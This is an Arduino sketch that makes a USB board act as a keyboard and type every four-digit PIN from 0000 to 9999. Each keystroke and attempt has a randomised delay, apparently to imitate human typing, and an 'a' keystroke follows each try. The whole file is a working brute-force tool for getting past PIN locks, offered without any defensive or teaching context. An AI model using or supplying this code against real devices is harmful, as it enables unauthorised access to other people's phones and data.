#include "HID-Project.h"

int digits[] = {
  0, 0, 0, 0
};

int asciiValues[] = {
  48, 49, 50, 51, 52, 53, 54, 55, 56, 57
};

void setup() {
  
  delay(15000);

  BootKeyboard.begin();

  int index = 0;

  for (index = 0; index < 10000; index++) { //loops through all passwords

    int digit = 3;

    for (digit = 3; digit > 0; digit--) {

        if (digits[digit] > 9) {

          digits[(digit - 1)] = digits[(digit - 1)] + 1;

          digits[digit] = 0;

        }

    }
    
    digit = 0;

    for (digit = 0; digit < 4; digit++) {

      BootKeyboard.write(asciiValues[digits[digit]]);
      delay(250 + (rand() % 200));

    }

    delay(800 + (rand() % 200));

    BootKeyboard.write("a");

    delay(900 + (rand() % 200));

    digits[3] = digits[3] + 1;

  }

}

void loop() {

}
